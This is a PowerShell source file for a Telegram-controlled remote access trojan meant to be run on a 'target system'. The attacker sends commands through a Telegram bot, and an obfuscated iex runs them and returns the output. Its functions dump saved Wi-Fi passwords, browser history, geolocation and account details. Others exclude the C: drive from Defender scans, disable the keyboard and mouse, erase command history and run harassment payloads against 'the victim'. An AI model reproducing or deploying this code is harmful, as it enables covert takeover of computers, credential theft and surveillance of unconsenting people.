<#
============================================= Beigeworm's Telegram RAT ========================================================

SYNOPSIS
This script connects target computer with a telegram chat to send powershell commands.

SETUP INSTRUCTIONS
1. visit https://t.me/botfather and make a bot.
2. add bot api to script.
3. search for bot in top left box in telegram and start a chat then type /start.
4. add chat ID for the chat bot (use this below to find the chat id) 

---------------------------------------------------
$token='YOUR_TOKEN' #Replace this with your bot Token
$URL='https://api.telegram.org/bot{0}' -f $Token
$inMessage=Invoke-RestMethod -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
$inMessage.result.message | write-output
$inMessage.result.message | get-member
-----------------------------------------------------

5. Run Script on target System
6. Check telegram chat for 'waiting to connect' message.
7. this script has a feature to wait until you start the session from telegram.
8. type in the computer name from that message into telegram bot chat to connect to that computer.

#>

#------------------------------------------------ SCRIPT SETUP ---------------------------------------------------
$Token = "$tg"
$ChatID = "$cid"
$PassPhrase = "$env:COMPUTERNAME"
$URL='https://api.telegram.org/bot{0}' -f $Token 
$AcceptedSession=""
$LastUnAuthenticatedMessage=""
$lastexecMessageID=""

#----------------------------------------------- ON CONNECT ------------------------------------------------------
sleep 1

$MessageToSend = New-Object psobject 
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Waiting to Connect.."
Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"


#----------------------------------------------- ACTION FUNCTIONS -------------------------------------------------

Function ServiceInfo {
$comm = Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
$outputPath = "$env:temp\serv.txt"
$comm | Out-File -FilePath $outputPath

$Pathsys = "$env:temp\serv.txt"
$msgsys = Get-Content -Path $Pathsys -Raw

$URL='https://api.telegram.org/bot{0}' -f $Token
$MessageToSend = New-Object psobject 
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$msgsys"
Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
}

Function Close{
$MessageToSend = New-Object psobject 
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Connection Closed."
Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
exit
}

Function Options{
Start-Sleep 1
Write-Output "=============================================="
Write-Output "============ BEIGETOOLS EXTRAS =============="
Write-Output "=============================================="
Write-Output "Commands list - "
Write-Output "=============================================="
Write-Output "ProgramList  : List of installed programs and EventLogs"
Write-Output "PublicIP    : Show the System's Public IP Address"
Write-Output "ServiceInfo : Show running services and locations."
Write-Output "BrowserHistory : Show Chrome and Edge browsing history."
Write-Output "SysInfo   : Return various system information."
Write-Output "SetWallpaper  : Change the wallpaper to a scary image."
Write-Output "EnableDarkMode : Enable System wide Dark Mode"
Write-Output "DisableDarkMode : Disable System wide Dark Mode"
Write-Output "ExcludeCDrive  : Exclude C:/ Drive from all Defender Scans"
Write-Output "Set-AudioMax : control the audio level."
Write-Output "UnmuteAudio   : control the audio to unmute it."
Write-Output "MuteAudio     : control the audio to mute it."
Write-Output "DisableKeyboard :  Disables the keyboard."
Write-Output "EnableKeyboard  :  Enables the keyboard again."
Write-Output "DisableMouse   :  Disables the mouse."
Write-Output "EnableMouse   :  Enables the mouse again."
Write-Output "KillDisplay   : Kill Displays for a few second"
Write-Output "SetkbUS      : Set Sys Language and Layout to US."
Write-Output "SoundSpam : Loops through and plays every wav file"
Write-Output "Rickroll   :Starts playing the best song of all time."
Write-Output "FakeUpdate  :Fake Windows Update Screen"
Write-Output "Windows93    : Start Windows-93 Parody OS"
Write-Output "ShortcutBomb  : Creates Shortcuts All Over The Desktop"
Write-Output "Send-CatFact  : random CatFact plays to the victim."
Write-Output "Send-Alarm    : Send alarm clock sound"
Write-Output "Send-DadJoke  : DadJoke and plays to the victim."
Write-Output "MinimizeApps  : Minimizes all the apps."
Write-Output "=============================================="
Write-Output "Options     : Show this Menu"
Write-Output "RMPersist     : Remove Persistance"
Write-Output "Close       : Close this connection"
Write-Output "CleanUp  : Del Temp fldrs, cmd history and trash."
Write-Output "=============================================="
}

Function RMPersist{
rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinServ_x32.vbs"
rm -Path "$env:APPDATA\Microsoft\Windows\x32.ps1"
Write-Output "Uninstalled."
}

Function KillDisplay {

(Add-Type '[DllImport("user32.dll")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
Write-Output "Done."
}

Function ShortcutBomb {

$n = 100
$i = 0

while($i -lt $n) 
{
$num = Get-Random
$Location = "C:\Windows\System32\rundll32.exe"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
$Shortcut.TargetPath = $Location
$Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll"
$Shortcut.IconLocation = "hotplug.dll,0"
$Shortcut.Description ="Device Removal"
$Shortcut.WorkingDirectory ="C:\Windows\System32"
$Shortcut.Save()
Start-Sleep -Milliseconds 10
$i++
}
Write-Output "Done."
}

Function FakeUpdate {
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "C:\Windows\System32\scrnsave.scr"
WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
$pth = "$env:APPDATA\Microsoft\Windows\1031.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 5
Write-Output "Done."
Remove-Item -Path $pth -Force
}

Function Win93 {
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "C:\Windows\System32\scrnsave.scr"
WshShell.Run "chrome.exe --new-window -kiosk windows93.net", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
$pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 5
Write-Output "Done."
Remove-Item -Path $pth -Force
}


Function SetkbUS {

Dism /online /Get-Intl
Set-WinSystemLocale en-US
Set-WinUserLanguageList en-US -force

}

function CleanUp { 

Remove-Item $env:temp\* -r -Force -ErrorAction SilentlyContinue

Remove-Item (Get-PSreadlineOption).HistorySavePath

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
Write-Output "Completed."
}


Function SoundSpam{
param
(
[Parameter()][int]$Interval = 3
)

 Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | Foreach-Object { Start-Sleep -Seconds $Interval; (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").Play(); }

 Write-Output "Completed."

}

Function MinimizeApps
{
 Write-Output "Minimizing..."

    $apps = New-Object -ComObject Shell.Application
    $apps.MinimizeAll()
 Write-Output "Done."

}


Function EnableDarkMode {
Write-Output "Enabling Dark Mode...."
               $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
            Set-ItemProperty $Theme AppsUseLightTheme -Value 0
            Start-Sleep 1
Write-Output "Done."
}

Function DisableDarkMode {
Write-Output "Disabling Dark Mode...."
        $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
        Set-ItemProperty $Theme AppsUseLightTheme -Value 1
        Start-Sleep 1
Write-Output "Done."
}

Function ExcludeCDrive {
Write-Output "Excluding C Drive"
        Add-MpPreference -ExclusionPath C:\
Write-Output "Done."
}


Function Rickroll{

$firstart = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"
If (Test-Path $firstart) {New-Item $firstart}
    Set-ItemProperty $firstart HideFirstRunExperience -Value 1
    cmd.exe ("/c taskkill /F /IM chrome.exe & start chrome.exe -kiosk https://www.youtube.com/watch?v=dQw4w9WgXcQ & exit")

function Do-SendKeys {
    param (
        $SENDKEYS,
        $WINDOWTITLE
    )
    $wshell = New-Object -ComObject wscript.shell;
    IF ($WINDOWTITLE) {$wshell.AppActivate($WINDOWTITLE)}
    Sleep 1
    IF ($SENDKEYS) {$wshell.SendKeys($SENDKEYS)}
}

Sleep 5
Do-SendKeys -WINDOWTITLE chrome.exe -SENDKEYS ("f")

Write-Output "Done."
}


Function Windows93{

$firstart = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"
If (Test-Path $firstart) {New-Item $firstart}
    Set-ItemProperty $firstart HideFirstRunExperience -Value 1
    cmd.exe ("/c taskkill /F /IM chrome.exe & start chrome.exe -kiosk windows93.net & exit")


Write-Output "Done."
}


Function FakeUpdate{

$firstart = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"
If (Test-Path $firstart) {New-Item $firstart}
    Set-ItemProperty $firstart HideFirstRunExperience -Value 1
    cmd.exe ("/c taskkill /F /IM chrome.exe & start chrome.exe -kiosk windows93.net & exit")


Write-Output "Done."
}

Function ProgramList {

$date = Get-Date -Format "yyyy-MM-dd-hh-mm-ss"
$outputPath = "$env:temp\Osint.txt"

New-Item -ItemType File -Path $outputPath

$installed = Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version, Vendor
$hotfixes = Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object -Property HotFixID, Description, InstalledOn
$removed = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object -Property DisplayName, DisplayVersion, Publisher, InstallDate | Where-Object {$_.DisplayName -ne $null}

$installed | Format-Table -AutoSize | Out-File -FilePath $outputPath 
$hotfixes | Format-Table -AutoSize | Out-File -FilePath $outputPath -Append
$removed | Format-Table -AutoSize | Out-File -FilePath $outputPath -Append

$userActivity = Get-EventLog -LogName Security -EntryType SuccessAudit | Where-Object {$_.EventID -eq 4624 -or $_.EventID -eq 4634}
$userActivity | Out-File -FilePath $outputPath -Append
$hardwareInfo = Get-EventLog -LogName System | Where-Object {$_.EventID -eq 12 -or $_.EventID -eq 13}
$hardwareInfo | Out-File -FilePath $outputPath -Append

$textfile = Get-Content "$env:temp\Osint.txt" -Raw
Write-Output "$textfile"

}

Function KillDisplay {

(Add-Type '[DllImport("user32.dll")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
Write-Output "Done."
}

Function VerboseStartup {
               $Thdddeme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            New-ItemProperty -Path $Thdddeme -Name 'VerboseStatus' -Value 1 -PropertyType DWord
            Start-Sleep 1
Write-Output "Done."
}

Function PublicIP{

$ipipip=((Inv`o`ke-`W`ebR`e`qu`e`st ifconfig.me/ip).Content.Trim() | Out-String)
Write-Output "IPv4 Address : $ipipip "

}

Function Set-AudioMax {
    Start-AudioControl
    [audio]::Volume = 1
    Write-Output "Done."
}

Function UnmuteAudio {
    Start-AudioControl
    [Audio]::Mute = $false
    Write-Output "Done."
}

Function MuteAudio {
    Start-AudioControl
    [Audio]::Mute = $true
    Write-Output "Done."
}

Function ShortcutBomb {
$n = 200
$i = 0

while($i -lt $n) 
{
$num = Get-Random
$Location = "C:\Windows\System32\rundll32.exe"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
$Shortcut.TargetPath = $Location
$Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll"
$Shortcut.IconLocation = "hotplug.dll,0"
$Shortcut.Description ="Device Removal"
$Shortcut.WorkingDirectory ="C:\Windows\System32"
$Shortcut.Save()
Start-Sleep -Milliseconds 10
$i++
}
Write-Output "Done."
}

Function DisableMouse
{
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Disable()
    Write-Output "Done."
}

Function EnableMouse
{
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Enable()
    Write-Output "Done."
}

Function DisableKeyboard
{
    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
    $PNPKeyboard.Disable()
    Write-Output "Done."
}

Function EnableKeyboard
{
    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
    $PNPKeyboard.Enable()
    Write-Output "Done."
}

Function Send-CatFact 
{
    Add-Type -AssemblyName System.speech
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $CatFact = Invoke-RestMethod -Uri 'https://catfact.ninja/fact' -Method Get | Select-Object -ExpandProperty fact
    $SpeechSynth.Speak("did you know?")
    $SpeechSynth.Speak($CatFact)

    Write-Output "Done."
}

Function Send-Message([string]$Message)
{
    msg.exe * $Message
    Write-Output "Done."
}

Function Send-Alarm
{
Write-Output "Starting an Alarm."

    Invoke-WebRequest -Uri "https://github.com/perplexityjeff/PowerShell-Troll/raw/master/AudioFiles/Wake-up-sounds.wav" -OutFile "Wake-up-sounds.wav"

    $filepath = ((Get-Childitem "Wake-up-sounds.wav").FullName)
    
    Write-Output $filepath

    $sound = new-Object System.Media.SoundPlayer;
    $sound.SoundLocation=$filepath;
    $sound.Play();

    Write-Output "Done."
}


Function BrowserHistory {
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}

$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}

Write-Output "$Value"
Write-Output "$Value2"
}


Function Sysinfo {
$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full")
$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerBIOS = Get-CimInstance CIM_BIOSElement
$computerOs=Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List
$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table

$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]

Add-Type -AssemblyName System.Device;$Geolocate = New-Object System.Device.Location.GeoCoordinateWatcher;$Geolocate.Start()
while (($Geolocate.Status -ne 'Ready') -and ($Geolocate.Permission -ne 'Denied')) {Start-Sleep -Milliseconds 100}  
$Geolocate.Position.Location | Select Latitude,Longitude

$outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}

$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}

$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}

$outpath = "$env:temp\systeminfo.txt"
"USER INFO `n =========================================================================" | Out-File -FilePath $outpath -Encoding ASCII
"Full Name          : $fullName" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Email Address      : $email" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Location           : $Geolocate" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Computer Name      : $env:COMPUTERNAME" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Language           : $systemLanguage" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Keyboard Layout    : $keyboardLayoutID" | Out-File -FilePath $outpath -Encoding ASCII -Append
"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
"NETWORK INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Public IP          : $computerPubIP" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Saved Networks     : $outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append

$textfile2 = Get-Content "$env:temp\systeminfo.txt" -Raw
Write-Output "$textfile2"
}

Function Send-DadJoke 
{
Write-Output "Sending dad joke..."

    Add-Type -AssemblyName System.speech
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Accept", 'text/plain')
    
    $DadJoke = Invoke-RestMethod -Uri 'https://icanhazdadjoke.com' -Method Get -Headers $headers
    
    $SpeechSynth.Speak($DadJoke)

    Write-Output "Done."
}


Function ServiceInfo {
$comm = Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
$outputPath = "$env:temp\service.txt"
$comm | Out-File -FilePath $outputPath

$Pathsys = Get-Content "$env:temp\service.txt" -Raw
Write-Output "$Pathsys"

}


Sleep 5

# --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
Function IsAuth{ 
param($CheckMessage)
    if (($messages.message.date -ne $LastUnAuthMsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){
    $script:AcceptedSession="Authenticated"
    $MessageToSend = New-Object psobject 
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME Session Started."
    Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
    return $messages.message.chat.id
    }
    Else{
    return 0
}}

Function StrmFX{
param(
$Stream
)
$FixedResult=@()
$Stream | Out-File -FilePath (Join-Path $env:TMP -ChildPath "TGPSMessages.txt") -Force
$ReadAsArray= Get-Content -Path (Join-Path $env:TMP -ChildPath "TGPSMessages.txt") | where {$_.length -gt 0}
foreach ($line in $ReadAsArray){
    $ArrObj=New-Object psobject
    $ArrObj | Add-Member -MemberType NoteProperty -Name "Line" -Value ($line).tostring()
    $FixedResult +=$ArrObj
}
return $FixedResult
}

Function stgmsg{
param(
$Messagetext,
$ChatID
)
$FixedText=StrmFX -Stream $Messagetext
$MessageToSend = New-Object psobject 
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line
$JsonData=($MessageToSend | ConvertTo-Json)
Invoke-RestMethod -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"
}

Function rtgmsg{
try{
        $inMessage=Invoke-RestMethod -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
        return $inMessage.result[-1]
}
Catch{
    return "TGFail"
}}

Sleep 5

While ($true){sleep 2
$messages=rtgmsg
if ($LastUnAuthMsg -like $null){$LastUnAuthMsg=$messages.message.date}
if (!($AcceptedSession)){$CheckAuthentication=IsAuth -CheckMessage $messages}
Else{
if (($CheckAuthentication -ne 0) -and ($messages.message.text -notlike $PassPhrase) -and ($messages.message.date -ne $lastexecMessageID)){
    try{
         $Result=ie`x($messages.message.text) -ErrorAction Stop
         $Result
         stgmsg -Messagetext $Result -ChatID $messages.message.chat.id
         }
   catch {stgmsg -Messagetext ($_.exception.message) -ChatID $messages.message.chat.id}
   Finally{$lastexecMessageID=$messages.message.date
}}}}
